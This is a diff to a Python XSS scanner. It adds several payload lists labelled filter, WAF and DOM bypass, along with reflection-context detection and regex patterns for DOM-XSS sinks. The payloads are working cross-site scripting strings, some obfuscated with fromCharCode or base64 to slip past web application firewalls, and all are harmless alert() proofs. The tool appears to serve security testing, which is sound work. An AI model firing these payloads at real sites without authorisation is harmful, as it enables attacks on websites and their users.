@@ -31,6 +31,49 @@ PAYLOAD_SETS: Dict[str, Sequence[str]] = {
         "<iframe srcdoc='<script>alert(1)</script>'>",
         "<math href=javascript:alert(1)>",
     ),
+    "filter_bypass": (
+        "<ScRiPt>alert('xss')</ScRiPt>",
+        "<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
+        "<img src=x onerror=\"alert('xss')\">",
+        "<svg/onload=alert(1)>",
+        "<body onload=alert(1)>",
+        "'>alert('xss')</script>",
+        "\"><script>alert('xss')</script>",
+        "<input onfocus=alert(1) autofocus>",
+        "<select onfocus=alert(1) autofocus>",
+        "<textarea onfocus=alert(1) autofocus>",
+        "<keygen onfocus=alert(1) autofocus>",
+        "<video><source onerror=alert(1)>",
+        "<audio src=x onerror=alert(1)>",
+    ),
+    "waf_bypass": (
+        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
+        "<script>setTimeout('alert(1)',0)</script>",
+        "<script>Function('alert(1)')()</script>",
+        "<script>['alert'](1)</script>",
+        "<script>window['alert'](1)</script>",
+        "<svg/onload=alert`1`>",
+        "<img src=x onerror=window['alert'](1)>",
+        "<svg onload=eval(atob('YWxlcnQoMSk='))>",
+        "<body onload=prompt(1)>",
+        "<input type=text onfocus=alert(1) autofocus>",
+        "<details open ontoggle=alert(1)>",
+        "<marquee onstart=alert(1)>",
+        "<div onmouseenter=alert(1)>test</div>",
+    ),
+    "dom_based": (
+        "<script>eval(location.hash.slice(1))</script>",
+        "<script>eval(document.location)</script>",
+        "<script>eval(window.name)</script>",
+        "<script>eval(document.referrer)</script>",
+        "<img src=x onerror=eval(window.location.hash.substring(1))>",
+    ),
+    "callback": (
+        "<script>jQuery.globalEval('alert(1)')</script>",
+        "<script>angular.element(document.body).injector().get('$eval')('alert(1)')</script>",
+        "<script>Vue.nextTick(function(){alert(1)})</script>",
+        "<script>React.createElement('script',{dangerouslySetInnerHTML:{__html:'alert(1)'}})</script>",
+    ),
 }
 
 
@@ -68,6 +111,8 @@ class XSSTester:
         headers: str = "",
         follow_redirects: str = "true",
         timeout: str = "8",
+        detect_context: str = "true",
+        dom_analysis: str = "false",
     ) -> ToolResult:
         target = target.strip()
         if not target:
@@ -116,6 +161,27 @@ class XSSTester:
             "",
             "Payload results:",
         ]
+        
+        # Context detection
+        detected_context: Optional[str] = None
+        if self._truthy(detect_context) and results:
+            baseline_response = self._get_baseline_response(opener, target, method, chosen_param, body, final_headers, timeout_val)
+            if baseline_response:
+                detected_context = self._detect_html_context(baseline_response, chosen_param)
+                if detected_context:
+                    lines.append(f"Detected context: {detected_context}")
+                    lines.append("")
+        
+        # DOM analysis
+        if self._truthy(dom_analysis) and results:
+            baseline_response = self._get_baseline_response(opener, target, method, chosen_param, body, final_headers, timeout_val)
+            if baseline_response:
+                dom_issues = self._analyze_dom_xss(baseline_response, chosen_param)
+                if dom_issues:
+                    lines.append("DOM XSS Analysis:")
+                    lines.extend(dom_issues)
+                    lines.append("")
+        
         for probe in results:
             markers: List[str] = []
             if probe.reflected:
@@ -236,6 +302,93 @@ class XSSTester:
                 pairs.append((parameter, payload))
             data = urllib.parse.urlencode(pairs).encode("utf-8")
         return target, data
+
+    def _get_baseline_response(
+        self,
+        opener: urllib.request.OpenerDirector,
+        target: str,
+        method: str,
+        parameter: str,
+        body_template: str,
+        headers: Dict[str, str],
+        timeout: float,
+    ) -> Optional[str]:
+        """Get baseline response without payload."""
+        url, data = self._apply_payload(target, method, parameter, "BASELINE_TEST_VALUE", body_template)
+        request = urllib.request.Request(url=url, data=data, method=method)
+        for key, value in headers.items():
+            request.add_header(key, value)
+        
+        try:
+            with opener.open(request, timeout=timeout) as resp:
+                body_bytes = resp.read(65536)
+                return body_bytes.decode("utf-8", errors="replace")
+        except Exception:
+            return None
+
+    def _detect_html_context(self, response: str, parameter: str) -> Optional[str]:
+        """Detect HTML context where parameter is reflected."""
+        test_value = "BASELINE_TEST_VALUE"
+        idx = response.find(test_value)
+        if idx == -1:
+            return None
+        
+        # Check surrounding context
+        before = response[max(0, idx - 100):idx].lower()
+        after = response[idx + len(test_value):idx + len(test_value) + 100].lower()
+        context = (before + " " + after).lower()
+        
+        # Detect context type
+        if "<script" in before or "</script" in before:
+            if "var" in before or "let" in before or "const" in before:
+                return "JavaScript variable context"
+            return "JavaScript context"
+        elif "onerror" in before or "onload" in before or "onclick" in before:
+            return "Event handler context"
+        elif "<input" in before or "<textarea" in before:
+            if "value=" in before:
+                return "HTML attribute context (value)"
+            return "HTML tag context"
+        elif context.count("<") > context.count(">"):
+            return "HTML tag context"
+        elif '"' in before or "'" in before:
+            return "HTML attribute context (quoted)"
+        elif "href=" in before or "src=" in before:
+            return "URL context"
+        else:
+            return "HTML body context"
+
+    def _analyze_dom_xss(self, response: str, parameter: str) -> List[str]:
+        """Analyze response for DOM-based XSS patterns."""
+        issues: List[str] = []
+        
+        # Look for dangerous JavaScript patterns
+        dangerous_patterns = [
+            (r"eval\s*\([^)]*location", "eval() with location - potential DOM XSS"),
+            (r"eval\s*\([^)]*document\.location", "eval() with document.location - potential DOM XSS"),
+            (r"innerHTML\s*=\s*[^;]*location", "innerHTML assignment with location - potential DOM XSS"),
+            (r"document\.write\s*\([^)]*location", "document.write() with location - potential DOM XSS"),
+            (r"document\.writeln\s*\([^)]*location", "document.writeln() with location - potential DOM XSS"),
+            (r"\.innerHTML\s*=.*window\.location", "innerHTML with window.location - potential DOM XSS"),
+            (r"location\.hash", "location.hash usage - potential DOM XSS"),
+            (r"document\.URL", "document.URL usage - potential DOM XSS"),
+            (r"document\.documentURI", "document.documentURI usage - potential DOM XSS"),
+            (r"window\.name", "window.name usage - potential DOM XSS"),
+        ]
+        
+        import re
+        for pattern, description in dangerous_patterns:
+            if re.search(pattern, response, re.IGNORECASE):
+                issues.append(f"⚠ {description}")
+        
+        return issues
+
+    def _truthy(self, value: str | bool | None) -> bool:
+        if isinstance(value, bool):
+            return value
+        if value is None:
+            return False
+        return str(value).strip().lower() in {"1", "true", "yes", "on"}
 
     def _parse_headers(self, blob: str) -> Dict[str, str]:
         headers: Dict[str, str] = {}
